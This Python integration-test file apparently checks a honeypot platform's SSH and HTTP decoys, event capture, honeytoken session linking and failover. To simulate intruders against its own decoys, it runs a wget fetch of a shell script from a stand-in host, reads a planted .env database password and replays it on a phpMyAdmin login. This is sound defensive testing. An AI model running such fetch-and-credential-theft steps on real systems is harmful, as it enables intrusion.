"""Gate 1 (docs/04-phase-1-spec.md section 6), against the running stack (`make up`).

Tests 7 and 8 are in test_containment.py and test_default_tells.py. Tests 3 and 4 (Redis and
MySQL) are skipped: the database decoys are not built. Test 5's token chain therefore runs
SSH -> HTTP: the SSH session reads the planted database password from /var/www/html/.env and
a separate HTTP session uses it on the phpMyAdmin login form.

The tests run in file order: test 6 stops the policy service and restarts it.
"""

from __future__ import annotations

import asyncio
import hashlib
import io
import json
import statistics
import time
import uuid
from datetime import UTC, datetime
from typing import Any

import httpx
import paramiko
import pytest

from .conftest import ROOT, container_ip, docker

pytestmark = pytest.mark.integration

REF = json.loads((ROOT / "decoys/profiles/reference/debian-12.json").read_text())
WAIT_S = 90


def _password() -> str:
    lines = (ROOT / "build/profile/cowrie/userdb.txt").read_text().splitlines()
    return next(ln.split(":", 2)[2] for ln in lines if ln.startswith("root:"))


def _db_token() -> dict[str, Any]:
    tokens = json.loads((ROOT / "build/profile/tokens.json").read_text())
    return next(t for t in tokens if t["type"] == "credential" and ".env" in t["planted_at"])


def poll(query, sql: str, ok=lambda rows: bool(rows), wait: float = WAIT_S) -> list[dict]:
    deadline = time.time() + wait
    rows: list[dict] = []
    while time.time() < deadline:
        rows = query(sql)
        if ok(rows):
            return rows
        time.sleep(2)
    pytest.fail(f"timed out after {wait:.0f} s waiting for: {sql}\nlast rows: {rows[:5]}")


class Shell:
    def __init__(self, port: int) -> None:
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(
            "127.0.0.1",
            port,
            "root",
            _password(),
            look_for_keys=False,
            allow_agent=False,
            timeout=15,
            banner_timeout=15,
        )
        self.chan = self.client.invoke_shell(width=200)
        time.sleep(1)
        self.out = self._drain()

    def _drain(self) -> bytes:
        out = b""
        while self.chan.recv_ready():
            out += self.chan.recv(65536)
        return out

    def run(self, cmd: str, wait: float = 0.8) -> str:
        self.chan.send((cmd + "\n").encode())
        time.sleep(wait)
        got = self._drain()
        self.out += got
        return got.decode(errors="replace")

    def close(self) -> None:
        self.chan.send(b"exit\n")
        time.sleep(0.5)
        self.client.close()


def ssh_session_id(query, t0: str, marker: str) -> str:
    rows = poll(
        query,
        "SELECT session_id FROM mirage.events FINAL WHERE source = 'cowrie' "
        f"AND ts >= '{t0}' AND position(JSONExtractString(payload, 'command'), '{marker}') > 0",
    )
    return rows[0]["session_id"]


def summary(query, sid: str, ok=lambda r: True) -> dict:
    rows = poll(
        query,
        f"SELECT * FROM mirage.session_summary FINAL WHERE session_id = '{sid}'",
        lambda rows: bool(rows) and ok(rows[0]),
    )
    return rows[0]


def http_session_of(query, conn_or_marker: str, t0: str) -> str:
    rows = poll(
        query,
        "SELECT session_id FROM mirage.events FINAL WHERE source = 'http-decoy' "
        f"AND ts >= '{t0}' AND class = 'http_activity' "
        f"AND position(JSONExtractString(payload, 'path'), '{conn_or_marker}') > 0",
    )
    conn = rows[0]["session_id"]
    mapped = poll(
        query, f"SELECT session_id FROM mirage.session_map FINAL WHERE conn_id = '{conn}'"
    )
    return mapped[0]["session_id"]


@pytest.fixture(scope="module")
def t0() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%d %H:%M:%S")


@pytest.fixture(scope="module")
def dead_letters_before(env) -> int:
    return dead_letter_count(env)


def dead_letter_count(env) -> int:
    import nats

    async def count() -> int:
        nc = await nats.connect(f"nats://127.0.0.1:{env.get('NATS_PORT', '4222')}")
        try:
            info = await nc.jetstream().stream_info("EVENTS", subjects_filter="events.deadletter")
            return (info.state.subjects or {}).get("events.deadletter", 0)
        finally:
            await nc.close()

    return asyncio.run(count())


# ----------------------------------------------------------------------------- test 1: SSH


@pytest.fixture(scope="module")
def ssh_run(env, clickhouse, t0, dead_letters_before):
    tag = uuid.uuid4().hex[:8]
    upload = f"gate1 upload {tag}\n".encode() * 64
    sh = Shell(int(env.get("SSH_PORT", "2222")))
    try:
        outputs = {
            "uname": sh.run("uname -a"),
            "id": sh.run("id"),
            "unknown": sh.run(f"mirage-gate1-unknown-{tag}"),
            "write": sh.run(f"echo {tag} > /tmp/gate1-{tag}.txt"),
            "cat": sh.run(f"cat /tmp/gate1-{tag}.txt"),
            "wget": sh.run(f"wget http://192.0.2.10/gate1-{tag}.sh", wait=4),
        }
        sftp = sh.client.open_sftp()
        sftp.putfo(io.BytesIO(upload), f"/tmp/gate1-up-{tag}.bin")
        sftp.close()
        time.sleep(0.5)
        outputs["after_sftp"] = sh.run(f"ls /tmp/gate1-up-{tag}.bin")
    finally:
        sh.close()
    sid = ssh_session_id(clickhouse, t0, f"mirage-gate1-unknown-{tag}")
    return {
        "tag": tag,
        "sid": sid,
        "out": outputs,
        "upload_sha": hashlib.sha256(upload).hexdigest(),
    }


def test_1_ssh_session_answered(ssh_run):
    o = ssh_run["out"]
    assert "Linux" in o["uname"] and "uid=0(root)" in o["id"]
    assert "command not found" in o["unknown"]
    assert ssh_run["tag"] in o["cat"]  # the redirection wrote the file


def test_1_ssh_session_captured_in_full(ssh_run, clickhouse):
    sid = ssh_run["sid"]

    def q(cond: str) -> list[dict]:
        return clickhouse(f"SELECT * FROM mirage.events FINAL WHERE session_id = '{sid}' {cond}")

    # Section 5 item 1: open and close, with the client's real address via PROXY v2.
    poll(
        clickhouse,
        f"SELECT 1 FROM mirage.events WHERE session_id = '{sid}' AND action = 'disconnect'",
    )
    (conn,) = q("AND action = 'connect'")
    # The decoy sees the client's address from the PROXY header, never the edge's own.
    edge_ips = {container_ip("edge", "mirage_decoy")}
    assert conn["src_ip"] and conn["src_ip"] not in edge_ips
    assert conn["sensor"]
    # 2: the authentication attempt with its credentials and outcome.
    (login,) = q("AND class = 'authentication'")
    assert login["outcome"] == "success"
    assert json.loads(login["payload"])["password"] == _password()
    # 3 and 4: every input in order with its seq, one decision each, and no fallbacks.
    row = summary(clickhouse, sid, lambda r: r["inputs"] >= 7 and r["decisions"] == r["inputs"])
    assert row["decisions"] == row["inputs"] and row["fallbacks"] == 0
    decisions = q("AND class = 'policy_decision' AND source = 'cowrie' ORDER BY ts")
    seqs = [json.loads(d["payload"])["seq"] for d in decisions]
    assert seqs == list(range(1, len(seqs) + 1))
    # ... each joined to the policy service's own record on request_id.
    rids = [json.loads(d["payload"])["request_id"] for d in decisions]
    joined = poll(
        clickhouse,
        "SELECT JSONExtractString(payload, 'request', 'request_id') AS rid FROM mirage.events "
        f"WHERE source = 'policy' AND rid IN ({','.join(repr(r) for r in rids)})",
        lambda rows: len({r["rid"] for r in rows}) == len(rids),
    )
    assert {r["rid"] for r in joined} == set(rids)
    # 6: state changes (the redirection and the SFTP upload) as cowrie.fs.change events.
    changes = [json.loads(r["payload"]) for r in q("AND action = 'fs_change'")]
    paths = {c.get("path") for c in changes}
    assert f"/tmp/gate1-{ssh_run['tag']}.txt" in paths
    assert any(c.get("sha256") for c in changes if c.get("op") == "write")
    # Cowrie stores what a redirection wrote and logs it as a download, by hash.
    stored = [json.loads(r["payload"]) for r in q("AND action = 'download'")]
    assert any(d.get("destfile") == f"/tmp/gate1-{ssh_run['tag']}.txt" for d in stored)
    # The wget attempt is recorded as input; it fetches nothing, as there is no egress.
    assert q(f"AND action = 'command' AND position(payload, 'gate1-{ssh_run['tag']}.sh') > 0")
    assert "192.0.2.10" in ssh_run["out"]["wget"]


def test_1_ssh_upload_is_an_indexed_artifact(ssh_run, clickhouse):
    sha = ssh_run["upload_sha"]
    assert clickhouse(
        f"SELECT 1 FROM mirage.events WHERE session_id = '{ssh_run['sid']}' "
        f"AND action = 'upload' AND JSONExtractString(payload, 'sha256') = '{sha}'"
    )
    (art,) = poll(clickhouse, f"SELECT * FROM mirage.artifacts WHERE sha256 = '{sha}'")
    assert art["source"] == "cowrie" and int(art["size"]) == 64 * len(
        f"gate1 upload {ssh_run['tag']}\n"
    )
    assert ssh_run["sid"] in art["sessions"]
    row = summary(clickhouse, ssh_run["sid"], lambda r: sha in r["artifacts"])
    assert sha in row["artifacts"]


def test_1_ssh_tty_log_replays(ssh_run, clickhouse):
    (log_row,) = poll(
        clickhouse,
        f"SELECT payload FROM mirage.events WHERE session_id = '{ssh_run['sid']}' "
        "AND action = 'ttylog_closed' LIMIT 1",
    )
    path = json.loads(log_row["payload"])["ttylog"]
    out = docker(
        "exec",
        "mirage-cowrie-1",
        "/cowrie/cowrie-env/bin/python3",
        "-m",
        "cowrie.scripts.playlog",
        "-m",
        "0",
        f"/cowrie/cowrie-git/{path}",
        timeout=60,
    ).stdout
    assert f"mirage-gate1-unknown-{ssh_run['tag']}" in out
    assert "command not found" in out


# ----------------------------------------------------------------------------- test 2: HTTP


@pytest.fixture(scope="module")
def http_run(env, clickhouse, t0, dead_letters_before):
    tag = uuid.uuid4().hex[:8]
    base = f"http://127.0.0.1:{env.get('HTTP_PORT', '8081')}"
    ua = f"gate1-http-{tag}"
    with httpx.Client(base_url=base, headers={"User-Agent": ua}, timeout=10) as c:
        r = {
            "index": c.get(f"/?gate1={tag}"),
            "env": c.get("/.env"),
            "login": c.post("/wp-login.php", data={"log": f"admin-{tag}", "pwd": f"pw-{tag}"}),
            "missing": c.get(f"/gate1-missing-{tag}"),
            "big": c.post("/", content=b"x" * (1024 * 1024 + 1)),
        }
    sid = http_session_of(clickhouse, f"gate1-missing-{tag}", t0)
    return {"tag": tag, "sid": sid, "r": r}


def test_2_http_responses(http_run):
    r = http_run["r"]
    assert r["index"].status_code == 200
    assert r["env"].status_code == 200 and "DB_PASSWORD" in r["env"].text
    assert r["login"].status_code == 200 and "incorrect" in r["login"].text
    ng = REF["nginx"]
    assert r["missing"].status_code == 404 and r["missing"].text == ng["404"]["body"]
    assert r["big"].status_code == 413 and r["big"].text == ng["413"]["body"]
    assert r["missing"].headers["server"] == ng["index"]["headers"]["Server"]


def test_2_http_session_captured(http_run, clickhouse):
    sid, tag = http_run["sid"], http_run["tag"]
    row = summary(clickhouse, sid, lambda r: r["inputs"] >= 5 and r["decisions"] >= 5)
    assert row["protocol"] == "http"
    assert row["inputs"] == row["decisions"] == 5 and row["fallbacks"] == 0
    assert len(row["connections"]) >= 1
    assert json.loads(row["fingerprints"])["user_agent"] == f"gate1-http-{tag}"
    assert [f"admin-{tag}", f"pw-{tag}"] in [list(c) for c in row["credentials"]]
    assert row["auth_attempts"] == 1 and row["auth_success"] == 0


@pytest.mark.skip(reason="Gate 1 test 3: the Redis decoy is not built (spec 1.5)")
def test_3_redis_session():
    pass


@pytest.mark.skip(reason="Gate 1 test 4: the MySQL decoy is not built (spec 1.5)")
def test_4_mysql_session():
    pass


# ----------------------------------------------------------------------------- test 5: tokens


def test_5_token_chain_ssh_to_http(env, clickhouse, t0):
    token = _db_token()
    tag = uuid.uuid4().hex[:8]
    sh = Shell(int(env.get("SSH_PORT", "2222")))
    try:
        sh.run(f"echo mirage-gate1-chain-{tag}")
        leaked = sh.run("cat /var/www/html/.env", wait=1.2)
    finally:
        sh.close()
    assert token["value"] in leaked  # the SSH side really exposes the planted password
    ssh_sid = ssh_session_id(clickhouse, t0, f"mirage-gate1-chain-{tag}")

    base = f"http://127.0.0.1:{env.get('HTTP_PORT', '8081')}"
    with httpx.Client(base_url=base, headers={"User-Agent": f"gate1-chain-{tag}"}) as c:
        c.get(f"/phpmyadmin/?gate1-chain-{tag}")
        c.post(
            "/phpmyadmin/",
            data={"pma_username": token["username"], "pma_password": token["value"]},
        )
    http_sid = http_session_of(clickhouse, "/phpmyadmin/", t0)

    finding = poll(
        clickhouse,
        "SELECT payload FROM mirage.events FINAL WHERE action = 'token_triggered' "
        f"AND JSONExtractString(payload, 'token_id') = '{token['token_id']}' "
        f"AND JSONExtractString(payload, 'session') = '{http_sid}'",
    )
    p = json.loads(finding[0]["payload"])
    assert p["planted_at"] == token["planted_at"]
    a, b = sorted((ssh_sid, http_sid))
    (link,) = poll(
        clickhouse,
        "SELECT * FROM mirage.actor_links FINAL "
        f"WHERE a = '{a}' AND b = '{b}' AND reason = 'honeytoken'",
    )
    assert json.loads(link["evidence"])["token_id"] == token["token_id"]
    actors = poll(
        clickhouse,
        "SELECT session_id, actor_id FROM mirage.session_summary FINAL "
        f"WHERE session_id IN ('{ssh_sid}', '{http_sid}')",
        lambda rows: len(rows) == 2 and rows[0]["actor_id"] == rows[1]["actor_id"],
    )
    assert actors[0]["actor_id"].startswith("actor-")
    (s,) = clickhouse(
        f"SELECT tokens FROM mirage.session_summary FINAL WHERE session_id = '{http_sid}'"
    )
    assert token["token_id"] in s["tokens"]


# ----------------------------------------------------------------------------- test 9: latency


def test_9_gating_latency_p95_under_20ms(env, clickhouse, t0):
    tag = uuid.uuid4().hex[:8]
    sh = Shell(int(env.get("SSH_PORT", "2222")))
    try:
        for i in range(25):
            sh.run(f"echo mirage-gate1-latency-{tag}-{i}", wait=0.3)
    finally:
        sh.close()
    base = f"http://127.0.0.1:{env.get('HTTP_PORT', '8081')}"
    with httpx.Client(base_url=base, headers={"User-Agent": f"gate1-latency-{tag}"}) as c:
        for i in range(25):
            c.get(f"/gate1-latency-{tag}-{i}")
    for source, n in (("cowrie", 25), ("http-decoy", 25)):
        rows = poll(
            clickhouse,
            "SELECT JSONExtractFloat(payload, 'latency_ms') AS ms FROM mirage.events FINAL "
            f"WHERE source = '{source}' AND class = 'policy_decision' AND ts >= '{t0}' "
            f"AND position(JSONExtractString(payload, 'command'), 'latency-{tag}') > 0",
            lambda rows, n=n: len(rows) >= n,
        )
        ms = sorted(float(r["ms"]) for r in rows)
        p95 = statistics.quantiles(ms, n=20)[18]
        assert p95 < 20, f"{source}: p95 {p95:.1f} ms over {len(ms)} decisions: {ms}"


# ----------------------------------------------------------------------------- test 6: policy down


@pytest.fixture
def policy_stopped():
    docker("stop", "-t", "2", "mirage-policy-1", timeout=60)
    try:
        yield
    finally:
        docker("start", "mirage-policy-1", timeout=60)
        deadline = time.time() + 60
        while time.time() < deadline:
            st = docker("inspect", "-f", "{{.State.Health.Status}}", "mirage-policy-1").stdout
            if st.strip() == "healthy":
                break
            time.sleep(1)


def test_6_decoys_fail_open_when_policy_is_down(env, clickhouse, t0, policy_stopped):
    tag = uuid.uuid4().hex[:8]
    sh = Shell(int(env.get("SSH_PORT", "2222")))
    try:
        out = sh.run(f"echo mirage-gate1-down-{tag}; uname -s", wait=1.5)
    finally:
        sh.close()
    assert f"mirage-gate1-down-{tag}" in out and "Linux" in out
    base = f"http://127.0.0.1:{env.get('HTTP_PORT', '8081')}"
    with httpx.Client(base_url=base, timeout=10) as c:
        r = c.get(f"/gate1-down-{tag}")
    assert r.status_code == 404 and r.text == REF["nginx"]["404"]["body"]
    for source in ("cowrie", "http-decoy"):
        rows = poll(
            clickhouse,
            "SELECT payload FROM mirage.events FINAL WHERE class = 'policy_decision' "
            f"AND source = '{source}' AND ts >= '{t0}' "
            f"AND position(JSONExtractString(payload, 'command'), 'gate1-down-{tag}') > 0",
        )
        p = json.loads(rows[0]["payload"])
        assert p["fallback"] is True and p["action"] == "allow", (source, p)
        assert p["fallback_reason"], (source, p)


# ----------------------------------------------------------------------------- test 10: pipeline


def test_10_pipeline_no_dead_letters_or_unknown_classes(
    env, clickhouse, t0, dead_letters_before, ssh_run, http_run
):
    time.sleep(5)
    unknown = clickhouse(
        "SELECT source, action, count() AS n FROM mirage.events "
        f"WHERE class = 'unknown' AND ingest_ts >= '{t0}' GROUP BY source, action"
    )
    assert unknown == []
    assert dead_letter_count(env) == dead_letters_before
